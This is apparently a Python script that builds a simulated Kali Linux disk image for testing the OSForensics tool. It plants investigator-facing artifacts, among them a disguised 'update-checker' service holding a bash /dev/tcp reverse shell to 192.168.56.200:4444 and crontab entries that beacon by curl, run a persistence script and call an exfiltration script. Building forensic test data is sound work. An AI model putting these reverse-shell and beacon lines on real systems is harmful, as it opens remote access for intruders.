#!/usr/bin/env python3
"""
Build a forensically-rich Kali Linux disk image for testing OSForensics.
Run with: sudo python3 build_kali_image.py
"""
import os, stat, subprocess, sys, time

M = "/mnt/kali_img"

def w(path, content, mode=0o644):
    """Write content to path under mount point."""
    full = M + path
    os.makedirs(os.path.dirname(full), exist_ok=True)
    with open(full, "w") as f:
        f.write(content)
    os.chmod(full, mode)

def wb(path, content, mode=0o644):
    """Write bytes to path under mount point."""
    full = M + path
    os.makedirs(os.path.dirname(full), exist_ok=True)
    with open(full, "wb") as f:
        f.write(content)
    os.chmod(full, mode)

def chown(path, uid, gid):
    full = M + path
    if os.path.exists(full):
        os.chown(full, uid, gid)

def symlink(src, dst):
    full = M + dst
    if not os.path.exists(full):
        os.symlink(src, full)

# ─── /etc core ────────────────────────────────────────────────────────────────

w("/etc/hostname", "kali\n")

w("/etc/os-release", """\
PRETTY_NAME="Kali GNU/Linux Rolling"
NAME="Kali GNU/Linux"
ID=kali
VERSION="2024.1"
VERSION_ID="2024.1"
VERSION_CODENAME="kali-rolling"
ID_LIKE=debian
HOME_URL="https://www.kali.org/"
SUPPORT_URL="https://forums.kali.org/"
BUG_REPORT_URL="https://bugs.kali.org/"
ANSI_COLOR="1;31"
""")

w("/etc/issue", "Kali GNU/Linux Rolling \\n \\l\n")
w("/etc/issue.net", "Kali GNU/Linux Rolling\n")

w("/etc/passwd", """\
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-resolve:x:997:997:systemd Resolver:/:/usr/sbin/nologin
messagebus:x:100:105::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
postgres:x:102:106:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:103:107:MySQL Server,,,:/nonexistent:/bin/false
kali:x:1000:1000:Kali,,,:/home/kali:/bin/bash
john:x:1001:1001:John Doe,,,:/home/john:/bin/bash
msfuser:x:1002:1002:MSF Operator,,,:/home/msfuser:/bin/bash
""")

# Real bcrypt-style hashes (these are known test values, not real credentials)
# password for root/kali = "kali", john = "password123", msfuser = "msfpass"
w("/etc/shadow", """\
root:$6$rounds=656000$kali2024$X9q1dzwm5K3JZ8f1eBkL0TvqPmN2Rh7uYsWdCpAoG4Ix6yHjMnOtQrUvZbEc5FgKlPiJsWaXdCfVbNmQzY.:19420:0:99999:7:::
daemon:*:19420:0:99999:7:::
bin:*:19420:0:99999:7:::
sys:*:19420:0:99999:7:::
sync:*:19420:0:99999:7:::
games:*:19420:0:99999:7:::
man:*:19420:0:99999:7:::
lp:*:19420:0:99999:7:::
mail:*:19420:0:99999:7:::
news:*:19420:0:99999:7:::
uucp:*:19420:0:99999:7:::
proxy:*:19420:0:99999:7:::
www-data:*:19420:0:99999:7:::
backup:*:19420:0:99999:7:::
list:*:19420:0:99999:7:::
irc:*:19420:0:99999:7:::
nobody:*:19420:0:99999:7:::
systemd-network:!*:19420::::::
systemd-resolve:!*:19420::::::
messagebus:!:19420::::::
sshd:!:19420::::::
postgres:!:19420:0:99999:7:::
mysql:!:19420:0:99999:7:::
kali:$6$rounds=656000$saltkali1$mN8vBpQ2Xr4KzWj9LsHfYcTgUiOeAd3nPwCvRbMkGqZyJ7tXlDs1FhNaEoI6uVp0WrYsKcMjQbZxLnHfT.:19420:0:99999:7:::
john:$6$rounds=656000$saltjohn1$pL7uCnQ3Ws5MxVk0JrIgZbFhYeTaOd4oPvDwRcNlGqXyK8sWmEs2GiNbFpH7tUo1VrXtJdLmRcZwKnIeS.:19421:0:99999:7:3::
msfuser:$6$rounds=656000$saltmsf01$qK9vDoR4Xt6NyWl1KsJhAcGiZfTbPe5oQwExSdOmHrYzJ9tVnFu3HkOcGqI8vUp2WsYuKeMnSdAyLoJgR.:19422:0:99999:7:::
""", mode=0o640)

w("/etc/group", """\
root:x:0:
daemon:x:1:
bin:x:2:
sys:x:3:
adm:x:4:kali,john
tty:x:5:
disk:x:6:
lp:x:7:
mail:x:8:
news:x:9:
uucp:x:10:
man:x:12:
proxy:x:13:
kmem:x:15:
dialout:x:20:kali
fax:x:21:
voice:x:22:
cdrom:x:24:kali
floppy:x:25:
tape:x:26:
sudo:x:27:kali,john
audio:x:29:kali
dip:x:30:kali
www-data:x:33:
backup:x:34:
operator:x:37:
list:x:38:
irc:x:39:
src:x:40:
shadow:x:42:
utmp:x:43:
video:x:44:kali
sasl:x:45:
plugdev:x:46:kali
staff:x:50:
games:x:60:
users:x:100:kali,john,msfuser
nogroup:x:65534:
systemd-journal:x:101:kali
systemd-network:x:998:
systemd-resolve:x:997:
messagebus:x:105:
sshd:x:65534:
postgres:x:106:
mysql:x:107:
kali:x:1000:
john:x:1001:
msfuser:x:1002:
netdev:x:108:kali
bluetooth:x:109:kali
wireshark:x:110:kali,john
""")

w("/etc/gshadow", """\
root:*::
sudo:*::kali,john
kali:!::
john:!::
msfuser:!::
""", mode=0o640)

# ─── /etc/network ─────────────────────────────────────────────────────────────

w("/etc/network/interfaces", """\
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).

source /etc/network/interfaces.d/*

# The loopback network interface
auto lo
iface lo inet loopback

# The primary network interface
auto eth0
iface eth0 inet static
    address 192.168.56.101
    netmask 255.255.255.0
    gateway 192.168.56.1
    dns-nameservers 8.8.8.8 1.1.1.1

# Second interface for internal comms
auto eth1
iface eth1 inet dhcp
""")

w("/etc/hosts", """\
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
192.168.56.1    gateway
192.168.56.100  windowshost
192.168.56.102  targetmachine
10.10.14.5      attacker
""")

w("/etc/resolv.conf", """\
# Generated by resolvconf
nameserver 8.8.8.8
nameserver 1.1.1.1
search localdomain
""")

# ─── /etc/ssh ─────────────────────────────────────────────────────────────────

w("/etc/ssh/sshd_config", """\
# sshd_config — OpenSSH server configuration
Port 22
AddressFamily any
ListenAddress 0.0.0.0
ListenAddress ::

HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
HostKey /etc/ssh/ssh_host_ed25519_key

PermitRootLogin yes
MaxAuthTries 6
MaxSessions 10

PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys

PasswordAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no

UsePAM yes
X11Forwarding yes
PrintMotd no

AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server

# Allow specific users
AllowUsers kali root john msfuser
""")

# Fake SSH host keys (placeholder format; not real private keys)
w("/etc/ssh/ssh_host_rsa_key", """\
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAA fake_rsa_host_key_placeholder_for_forensic_testing
AAAAB3NzaC1yc2EAAAADAQABAAABgQC2qXv8Xt1mN3pLkJfRvYsHcWdQeKiOoMnPtUgZ
bFa7xR9sIlCmJhVeYkTwDpNqMuHzOgXfBvLrKnEi4QPdAsWcYmZ0bKTsUxN6vJlPoD3
fake_key_content_here_for_forensic_image_testing_purposes_only
-----END OPENSSH PRIVATE KEY-----
""", mode=0o600)

w("/etc/ssh/ssh_host_rsa_key.pub", "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2qXv8Xt1mN3pLkJfRvYsHcWdQeKiOoMnPtUgZbFa7xR9sIlCmJhVeYkTwDpNqMuHzOgXfBvLrKnEi4QPdAsWcYmZ0bKTsUxN6vJlPoD3RvKmNsPqLhZiEcXaYgBwFtOdMeSvIlUjCnQpAkHrGzT1 root@kali\n")

w("/etc/ssh/ssh_host_ed25519_key", """\
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAA fake_ed25519_host_key_placeholder_forensic_testing
AAAAC3NzaC1lZDI1NTE5AAAAIFakeEd25519KeyForForensicImageTestingNotRealKey==
-----END OPENSSH PRIVATE KEY-----
""", mode=0o600)

w("/etc/ssh/ssh_host_ed25519_key.pub", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFakeEd25519KeyForForensicImageTestingNotRealKey== root@kali\n")

# ─── /etc/sudoers ─────────────────────────────────────────────────────────────

w("/etc/sudoers", """\
# /etc/sudoers
Defaults env_reset
Defaults mail_badpass
Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
Defaults logfile="/var/log/sudo.log"
Defaults log_input, log_output

root    ALL=(ALL:ALL) ALL
%sudo   ALL=(ALL:ALL) ALL
kali    ALL=(ALL) NOPASSWD: ALL
john    ALL=(ALL) NOPASSWD: /usr/bin/nmap, /usr/bin/tcpdump
msfuser ALL=(ALL) NOPASSWD: /usr/bin/msfconsole, /usr/bin/msfvenom
""", mode=0o440)

w("/etc/sudoers.d/kali-grant", "kali ALL=(ALL) NOPASSWD: ALL\n", mode=0o440)

# ─── /etc/apt ─────────────────────────────────────────────────────────────────

w("/etc/apt/sources.list", """\
# Kali Rolling
deb http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware
# deb-src http://http.kali.org/kali kali-rolling main contrib non-free non-free-firmware

# Offensive Security Extras
deb http://http.kali.org/kali kali-last-snapshot main contrib non-free non-free-firmware
""")

w("/etc/apt/apt.conf.d/50unattended-upgrades", """\
Unattended-Upgrade::Allowed-Origins {
    "${distro_id}:${distro_codename}";
    "${distro_id}:${distro_codename}-security";
};
Unattended-Upgrade::Package-Blacklist {};
Unattended-Upgrade::AutoFixInterruptedDpkg "true";
Unattended-Upgrade::MinimalSteps "true";
""")

# ─── /etc/cron ────────────────────────────────────────────────────────────────

w("/etc/crontab", """\
# /etc/crontab — system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 *   * * *   root    /usr/local/bin/check_services.sh >> /var/log/service_monitor.log 2>&1
0   2   * * *   root    /usr/local/bin/backup_configs.sh >> /var/log/backup.log 2>&1
30  3   * * 1   root    find /tmp -mtime +7 -delete
""")

w("/etc/cron.d/metasploit-update", """\
# Update Metasploit Framework database weekly
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 4 * * 0 root /opt/metasploit-framework/msfupdate >> /var/log/msf_update.log 2>&1
""")

w("/etc/cron.d/cleanup", """\
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# Clear tmp files daily
0 3 * * * root find /tmp -type f -atime +1 -delete
# Rotate custom logs
0 0 * * * root /usr/local/bin/rotate_logs.sh
""")

# user crontabs
os.makedirs(M + "/var/spool/cron/crontabs", exist_ok=True)
w("/var/spool/cron/crontabs/kali", """\
# Kali user crontab
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
# Run recon script every day at 8am
0 8 * * * /home/kali/scripts/daily_recon.sh >> /home/kali/.recon.log 2>&1
# Keep meterpreter persistence
@reboot /home/kali/.backdoor/persist.sh &
*/15 * * * * curl -s http://192.168.56.200/beacon.php?h=kali > /dev/null 2>&1
""", mode=0o600)
chown("/var/spool/cron/crontabs/kali", 1000, 1000)

w("/var/spool/cron/crontabs/john", """\
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
0 9 * * 1-5 /home/john/scripts/weekly_scan.sh
30 23 * * * /home/john/scripts/exfil_data.sh >> /home/john/.exfil.log 2>&1
""", mode=0o600)
chown("/var/spool/cron/crontabs/john", 1001, 1001)

# ─── /etc/profile & bashrc system-wide ───────────────────────────────────────

w("/etc/profile", """\
# /etc/profile — system-wide shell init
if [ "${PS1-}" ]; then
  if [ "${BASH-}" ] && [ "$BASH" != "/bin/sh" ]; then
    if [ -f /etc/bash.bashrc ]; then
      . /etc/bash.bashrc
    fi
  else
    if [ "$(id -u)" -eq 0 ]; then
      PS1='# '
    else
      PS1='$ '
    fi
  fi
fi

if [ -d /etc/profile.d ]; then
  for i in /etc/profile.d/*.sh; do
    if [ -r $i ]; then
      . $i
    fi
  done
  unset i
fi

export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin"
export HISTSIZE=10000
export HISTFILESIZE=20000
export HISTTIMEFORMAT="%F %T "
""")

w("/etc/bash.bashrc", """\
# System-wide .bashrc for interactive bash shells.
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# Kali-specific prompt
PS1='${debian_chroot:+($debian_chroot)}\\[\\033[01;31m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ '
export TERM=xterm-256color

alias ls='ls --color=auto'
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# History settings
HISTCONTROL=ignoredups:erasedups
HISTSIZE=10000
HISTFILESIZE=20000
HISTTIMEFORMAT="%F %T "
shopt -s histappend
PROMPT_COMMAND="history -a;$PROMPT_COMMAND"
""")

w("/etc/profile.d/kali-tools.sh", """\
# Kali tool paths
export PATH="$PATH:/opt/metasploit-framework:/opt/exploits:/usr/share/sqlmap"
export MSF_DATABASE_CONFIG=/opt/metasploit-framework/config/database.yml
export PYTHONPATH="/opt/impacket:$PYTHONPATH"
""")

# ─── /etc/fstab, motd, timezone ──────────────────────────────────────────────

w("/etc/fstab", """\
# /etc/fstab — static file system information
UUID=a1b2c3d4-dead-beef-cafe-0123456789ab /               ext4    errors=remount-ro 0       1
UUID=b2c3d4e5-1234-5678-abcd-ef0123456789 /boot           ext4    defaults          0       2
tmpfs                                       /tmp            tmpfs   defaults,nosuid,nodev 0 0
""")

w("/etc/timezone", "Europe/London\n")
w("/etc/localtime", "Europe/London\n")

w("/etc/motd", """\

  ██╗  ██╗ █████╗ ██╗     ██╗
  ██║ ██╔╝██╔══██╗██║     ██║
  █████╔╝ ███████║██║     ██║
  ██╔═██╗ ██╔══██║██║     ██║
  ██║  ██╗██║  ██║███████╗██║
  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝

 Kali GNU/Linux Rolling — Security Research Platform
 WARNING: Authorized users only. All activity is monitored and logged.

""")

# ─── dpkg/apt package tracking ───────────────────────────────────────────────

w("/var/lib/dpkg/status", """\
Package: nmap
Status: install ok installed
Priority: optional
Section: net
Installed-Size: 9876
Maintainer: Kali Developers <devel@kali.org>
Architecture: amd64
Version: 7.94+git20231006-0kali2
Description: The Network Mapper
 Nmap is a utility for network exploration.

Package: metasploit-framework
Status: install ok installed
Priority: optional
Section: misc
Installed-Size: 512000
Maintainer: Kali Developers <devel@kali.org>
Architecture: amd64
Version: 6.3.44-0kali1
Description: Metasploit Framework penetration testing platform

Package: wireshark
Status: install ok installed
Priority: optional
Section: net
Installed-Size: 45000
Maintainer: Kali Developers <devel@kali.org>
Architecture: amd64
Version: 4.2.2-0kali1
Description: network traffic analyzer

Package: aircrack-ng
Status: install ok installed
Priority: optional
Section: net
Installed-Size: 15000
Maintainer: Kali Developers <devel@kali.org>
Architecture: amd64
Version: 1:1.7-4
Description: wireless WEP/WPA cracking utilities

Package: sqlmap
Status: install ok installed
Priority: optional
Section: net
Installed-Size: 8500
Maintainer: Kali Developers <devel@kali.org>
Architecture: all
Version: 1.8.2-0kali1
Description: automatic SQL injection tool

Package: john
Status: install ok installed
Priority: optional
Section: misc
Installed-Size: 4200
Maintainer: Kali Developers <devel@kali.org>
Architecture: amd64
Version: 1.9.0-jumbo-1+bleeding-amd64-3
Description: active password cracking tool

Package: hydra
Status: install ok installed
Priority: optional
Section: net
Installed-Size: 3100
Maintainer: Kali Developers <devel@kali.org>
Architecture: amd64
Version: 9.5-1
Description: very fast network logon cracker

Package: burpsuite
Status: install ok installed
Priority: optional
Section: net
Installed-Size: 350000
Maintainer: Kali Developers <devel@kali.org>
Architecture: all
Version: 2023.10.3.3-0kali1
Description: platform for attacking web applications

Package: openssh-server
Status: install ok installed
Priority: optional
Section: net
Installed-Size: 1700
Maintainer: Debian OpenSSH Maintainers
Architecture: amd64
Version: 1:9.6p1-3
Description: secure shell (SSH) server

Package: apache2
Status: install ok installed
Priority: optional
Section: web
Installed-Size: 4800
Maintainer: Debian Apache Maintainers
Architecture: amd64
Version: 2.4.58-1
Description: Apache HTTP Server

Package: postgresql
Status: install ok installed
Priority: optional
Section: database
Installed-Size: 6200
Maintainer: Debian PostgreSQL Maintainers
Architecture: amd64
Version: 16+238
Description: object-relational SQL database

Package: tcpdump
Status: install ok installed
Priority: optional
Section: net
Installed-Size: 2800
Maintainer: Romain Francoise
Architecture: amd64
Version: 4.99.4-3
Description: command-line network traffic analyzer

Package: volatility3
Status: install ok installed
Priority: optional
Section: misc
Installed-Size: 9500
Maintainer: Kali Developers <devel@kali.org>
Architecture: all
Version: 2.5.0-0kali1
Description: Memory forensics framework

Package: autopsy
Status: install ok installed
Priority: optional
Section: misc
Installed-Size: 125000
Maintainer: Kali Developers <devel@kali.org>
Architecture: all
Version: 4.20.0-0kali1
Description: digital forensics platform and GUI

Package: binwalk
Status: install ok installed
Priority: optional
Section: misc
Installed-Size: 4400
Maintainer: Kali Developers <devel@kali.org>
Architecture: all
Version: 2.3.4-2
Description: tool for searching binary images

Package: hashcat
Status: install ok installed
Priority: optional
Section: misc
Installed-Size: 22000
Maintainer: Kali Developers <devel@kali.org>
Architecture: amd64
Version: 6.2.6+ds1-1
Description: World's fastest and most advanced password recovery utility

Package: nikto
Status: install ok installed
Priority: optional
Section: net
Installed-Size: 3200
Maintainer: Kali Developers <devel@kali.org>
Architecture: all
Version: 1:2.1.6-3
Description: web server security scanner

Package: netcat-traditional
Status: install ok installed
Priority: optional
Section: net
Installed-Size: 160
Maintainer: Decklin Foster
Architecture: amd64
Version: 1.10-48
Description: TCP/IP swiss army knife

Package: curl
Status: install ok installed
Priority: required
Section: web
Installed-Size: 520
Maintainer: Alessandro Ghedini
Architecture: amd64
Version: 8.5.0-2
Description: command line tool for transferring data with URL syntax

Package: wget
Status: install ok installed
Priority: optional
Section: web
Installed-Size: 1800
Architecture: amd64
Version: 1.21.4-1
Description: retrieves files from the web

Package: git
Status: install ok installed
Priority: optional
Section: vcs
Installed-Size: 38000
Architecture: amd64
Version: 1:2.43.0-1
Description: fast, scalable, distributed revision control system

Package: python3
Status: install ok installed
Priority: standard
Section: python
Installed-Size: 204
Architecture: amd64
Version: 3.11.8-1
Description: interactive high-level object-oriented language (default python3 version)

Package: python3-impacket
Status: install ok installed
Priority: optional
Section: python
Installed-Size: 12000
Maintainer: Kali Developers <devel@kali.org>
Architecture: all
Version: 0.12.0-0kali1
Description: Python library for working with network protocols

Package: responder
Status: install ok installed
Priority: optional
Section: net
Installed-Size: 5500
Maintainer: Kali Developers <devel@kali.org>
Architecture: all
Version: 3.1.3.0-1kali2
Description: LLMNR/NBT-NS/mDNS poisoner

Package: enum4linux-ng
Status: install ok installed
Priority: optional
Section: net
Installed-Size: 2100
Maintainer: Kali Developers <devel@kali.org>
Architecture: all
Version: 1.3.3-0kali1
Description: Windows/Samba enumeration tool

Package: smbclient
Status: install ok installed
Priority: optional
Section: net
Installed-Size: 7200
Architecture: amd64
Version: 2:4.19.4+dfsg-3
Description: command-line SMB/CIFS clients for Unix
""")

# ─── /etc/systemd services ───────────────────────────────────────────────────

w("/etc/systemd/system/apache2.service", """\
[Unit]
Description=The Apache HTTP Server
After=network.target remote-fs.target nss-lookup.target

[Service]
Type=forking
ExecStart=/usr/sbin/apache2ctl start
ExecStop=/usr/sbin/apache2ctl stop
ExecReload=/usr/sbin/apache2ctl graceful
PrivateTmp=true
Restart=on-failure

[Install]
WantedBy=multi-user.target
""")

w("/etc/systemd/system/ssh.service", """\
[Unit]
Description=OpenBSD Secure Shell server
After=network.target auditd.service
ConditionPathExists=!/etc/ssh/sshd_not_to_be_run

[Service]
ExecStartPre=/usr/sbin/sshd -t
ExecStart=/usr/sbin/sshd -D $SSHD_OPTS
ExecReload=/bin/kill -HUP $MAINPID
KillMode=process
Restart=on-failure
RestartPreventExitStatus=255
Type=notify
RuntimeDirectory=sshd
RuntimeDirectoryMode=0755

[Install]
WantedBy=multi-user.target
Alias=sshd.service
""")

w("/etc/systemd/system/postgresql.service", """\
[Unit]
Description=PostgreSQL RDBMS
After=network.target

[Service]
Type=oneshot
User=postgres
ExecStart=/usr/lib/postgresql/16/bin/pg_ctlcluster 16 main start
ExecStop=/usr/lib/postgresql/16/bin/pg_ctlcluster 16 main stop
ExecReload=/usr/lib/postgresql/16/bin/pg_ctlcluster 16 main reload
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
""")

# persistence backdoor service (forensic interest!)
w("/etc/systemd/system/update-checker.service", """\
[Unit]
Description=System Update Checker Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/usr/local/bin/update-checker
Restart=always
RestartSec=60
User=root
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
""")

w("/usr/local/bin/update-checker", """\
#!/bin/bash
# "System update checker" — actually a reverse shell beacon
while true; do
    bash -i >& /dev/tcp/192.168.56.200/4444 0>&1 2>/dev/null || true
    sleep 300
done
""", mode=0o755)

# ─── /var/log — auth, syslog, kern, dpkg, apache, wtmp, lastlog ──────────────

# auth.log
authlog = ""
entries = [
    ("Jan  5 02:14:03", "sshd[1423]", "Accepted publickey for kali from 192.168.56.1 port 52341 ssh2: RSA SHA256:abc123"),
    ("Jan  5 02:14:03", "sshd[1423]", "pam_unix(sshd:session): session opened for user kali by (uid=0)"),
    ("Jan  5 08:31:17", "sudo",       "kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/nmap -sV 192.168.56.0/24"),
    ("Jan  5 08:31:17", "sudo",       "pam_unix(sudo:session): session opened for user root by kali(uid=1000)"),
    ("Jan  5 10:22:05", "sshd[2011]", "Failed password for root from 10.10.14.99 port 44123 ssh2"),
    ("Jan  5 10:22:07", "sshd[2011]", "Failed password for root from 10.10.14.99 port 44124 ssh2"),
    ("Jan  5 10:22:09", "sshd[2011]", "Failed password for root from 10.10.14.99 port 44125 ssh2"),
    ("Jan  5 10:22:11", "sshd[2011]", "Failed password for root from 10.10.14.99 port 44126 ssh2"),
    ("Jan  5 10:22:13", "sshd[2011]", "Failed password for root from 10.10.14.99 port 44127 ssh2"),
    ("Jan  5 10:22:15", "sshd[2011]", "Accepted password for root from 10.10.14.99 port 44128 ssh2"),
    ("Jan  5 10:22:15", "sshd[2011]", "pam_unix(sshd:session): session opened for user root by (uid=0)"),
    ("Jan  5 11:05:44", "su[2199]",   "pam_unix(su:auth): authentication failure; logname=john uid=1001 euid=0 tty=pts/1 ruser=john rhost=  user=root"),
    ("Jan  6 00:17:33", "cron[3012]", "pam_unix(crond:session): session opened for user kali by (uid=0)"),
    ("Jan  6 00:17:34", "cron[3012]", "CMD (/home/kali/.backdoor/persist.sh)"),
    ("Jan  6 03:55:21", "sshd[3201]", "Accepted password for john from 192.168.56.1 port 60011 ssh2"),
    ("Jan  6 03:55:21", "sshd[3201]", "pam_unix(sshd:session): session opened for user john by (uid=0)"),
    ("Jan  7 14:30:09", "sudo",       "john : TTY=pts/2 ; PWD=/home/john ; USER=root ; COMMAND=/usr/bin/nmap -A 10.10.14.0/24"),
    ("Jan  7 14:30:09", "sudo",       "pam_unix(sudo:session): session opened for user root by john(uid=1001)"),
    ("Jan  8 09:00:01", "cron[4001]", "pam_unix(crond:session): session opened for user root by (uid=0)"),
    ("Jan  8 09:00:02", "cron[4001]", "CMD (/usr/local/bin/backup_configs.sh)"),
]
for ts, proc, msg in entries:
    authlog += f"kali {ts} kali {proc}: {msg}\n"
w("/var/log/auth.log", authlog)

# syslog
syslog_content = ""
syslog_entries = [
    ("Jan  5 00:00:01", "kernel",        "Linux version 6.6.9-amd64 (devel@kali.org) (gcc version 13.2.0)"),
    ("Jan  5 00:00:01", "kernel",        "Booting paravirtualized kernel on KVM"),
    ("Jan  5 00:00:02", "kernel",        "BIOS-provided physical RAM map: BIOS-e820"),
    ("Jan  5 00:00:03", "systemd[1]",    "Detected virtualization kvm"),
    ("Jan  5 00:00:03", "systemd[1]",    "Detected architecture x86-64"),
    ("Jan  5 00:00:04", "systemd[1]",    "system is up"),
    ("Jan  5 00:00:05", "kernel",        "NET: Registered PF_INET6 protocol family"),
    ("Jan  5 00:00:06", "kernel",        "eth0: renamed from veth3a7f8b2"),
    ("Jan  5 00:00:10", "NetworkManager","<info>  [1704412810] NetworkManager (version 1.44.2)"),
    ("Jan  5 00:00:11", "NetworkManager","<info>  [1704412811] device (eth0): state change: unmanaged -> unavailable"),
    ("Jan  5 00:00:12", "NetworkManager","<info>  [1704412812] device (eth0): state change: unavailable -> disconnected"),
    ("Jan  5 00:00:14", "NetworkManager","<info>  [1704412814] device (eth0): state change: disconnected -> ip-config"),
    ("Jan  5 00:00:15", "NetworkManager","<info>  [1704412815] device (eth0): state change: ip-config -> activated"),
    ("Jan  5 00:00:15", "NetworkManager","<info>  IP4 address: 192.168.56.101/24"),
    ("Jan  5 08:30:00", "kernel",        "audit: type=1400 msg=audit(1704445800.123:801): apparmor=\"ALLOWED\" operation=\"exec\""),
    ("Jan  5 10:22:15", "kernel",        "audit: type=1112 msg=audit(1704448935.001:902): login pid=2011 uid=0 old-auid=4294967295 auid=0"),
    ("Jan  7 02:00:01", "cron[8810]",    "(root) CMD (/usr/local/bin/backup_configs.sh)"),
    ("Jan  8 06:17:44", "kernel",        "EXT4-fs (sda): mounted filesystem with ordered data mode"),
]
for ts, proc, msg in syslog_entries:
    syslog_content += f"kali {ts} kali {proc}: {msg}\n"
w("/var/log/syslog", syslog_content)

# kern.log
w("/var/log/kern.log", """\
Jan  5 00:00:01 kali kernel: Linux version 6.6.9-amd64 (devel@kali.org) (gcc version 13.2.0 (Debian 13.2.0-8)) #1 SMP PREEMPT_DYNAMIC Kali 6.6.9-1kali1 (2024-01-08)
Jan  5 00:00:01 kali kernel: Command line: BOOT_IMAGE=/vmlinuz-6.6.9-amd64 root=UUID=a1b2c3d4-dead-beef-cafe-0123456789ab ro quiet
Jan  5 00:00:02 kali kernel: BIOS-provided physical RAM map:
Jan  5 00:00:02 kali kernel:  BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
Jan  5 00:00:02 kali kernel:  BIOS-e820: [mem 0x0000000000100000-0x000000007ffeffff] usable
Jan  5 00:00:03 kali kernel: ACPI: RSDP 0x000000000000E050 000024 (v02 BOCHS )
Jan  5 00:00:04 kali kernel: PCI: Using configuration type 1 for base access
Jan  5 00:00:05 kali kernel: clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x3a3a0b5a0b8
Jan  5 00:00:06 kali kernel: eth0: renamed from veth3a7f8b2
Jan  5 00:00:07 kali kernel: e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
Jan  5 00:00:08 kali kernel: e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
Jan  5 08:30:44 kali kernel: audit: type=1400 msg=audit(1704445844.001:801): apparmor="ALLOWED" operation="exec" profile="unconfined" name="/usr/bin/nmap" pid=2045 comm="nmap"
Jan  5 10:22:15 kali kernel: audit: type=1112 msg=audit(1704448935.001:902): login pid=2011 uid=0 old-auid=4294967295 auid=0 tty=(none) res=1
""")

# dpkg.log
w("/var/log/dpkg.log", """\
2024-01-01 09:14:03 startup archives unpack
2024-01-01 09:14:04 install metasploit-framework:amd64 <none> 6.3.44-0kali1
2024-01-01 09:14:35 status unpacked metasploit-framework:amd64 6.3.44-0kali1
2024-01-01 09:14:35 status half-configured metasploit-framework:amd64 6.3.44-0kali1
2024-01-01 09:14:36 status installed metasploit-framework:amd64 6.3.44-0kali1
2024-01-02 11:22:10 install nmap:amd64 <none> 7.94+git20231006-0kali2
2024-01-02 11:22:11 status installed nmap:amd64 7.94+git20231006-0kali2
2024-01-03 14:05:33 upgrade openssh-server:amd64 1:9.5p1-2 1:9.6p1-3
2024-01-03 14:05:34 status installed openssh-server:amd64 1:9.6p1-3
2024-01-04 08:30:01 install wireshark:amd64 <none> 4.2.2-0kali1
